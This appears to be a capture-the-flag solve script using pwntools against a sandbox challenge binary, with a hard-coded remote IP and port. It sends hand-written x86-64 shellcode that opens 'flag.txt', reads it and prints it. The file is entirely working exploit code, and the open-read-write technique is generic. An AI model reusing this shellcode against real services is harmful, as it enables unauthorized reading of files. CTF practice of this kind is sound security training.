#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('blackglass_sandbox', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x15555554d000

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('34.62.69.250', 41053)
else:
    p = process([exe.path])
GDB()

load = asm("""
    mov rdi, 8392585648256674918
    push 0
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov eax, 0x2
    syscall
        
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x50
    mov eax, 0
    syscall

    mov rdi, 1
    mov eax, 1
    syscall
    
""")

sa(b'stage:\n', load)

p.interactive()
